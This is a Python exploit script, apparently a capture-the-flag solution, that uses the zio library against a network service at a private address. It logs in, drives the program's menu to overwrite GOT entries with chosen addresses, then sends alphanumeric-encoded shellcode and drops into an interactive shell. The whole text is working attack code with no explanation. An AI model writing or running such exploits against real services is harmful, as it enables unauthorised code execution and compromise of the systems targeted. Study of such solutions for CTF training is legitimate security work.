from zio import *

host = "192.168.1.104"
port = 2333

target = (host,port)
io = zio(target,timeout=100000)

#raw_input()
#login
io.read_until(':')
io.writeline('1')
io.read_until(':')
io.writeline('student_=.=')
io.read_until(':')
io.writeline('000000')
io.read_until(':')
io.writeline('1234')
io.read_until('it!\n')

#hook got
io.read_until(':')
io.writeline('3')
io.read_until(':')
io.writeline('134514070')
io.read_until(':')
io.writeline('aaaa')
io.read_until(':')
io.writeline('3')
io.read_until(':')
io.writeline('2')
io.read_until(':')
io.writeline('bbbb')
io.read_until(':')
io.writeline('4')
io.read_until(':')
io.writeline('134514070')
io.read_until(':')
io.writeline('c'*20 + l32(0)+l32(0x804a888))
#io.interact()
io.read_until(':')
io.writeline('4')
io.read_until(':')
io.writeline('134514070')
io.read_until(':')
io.writeline(l32(0x80488f1)+l32(0x80488f1))
io.read_until('$ ')
io.writeline('PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQkyHwhah0vk0QaxtoDorSCX1xDobB59rNlIXcHMOpAABigtang')
io.interact()
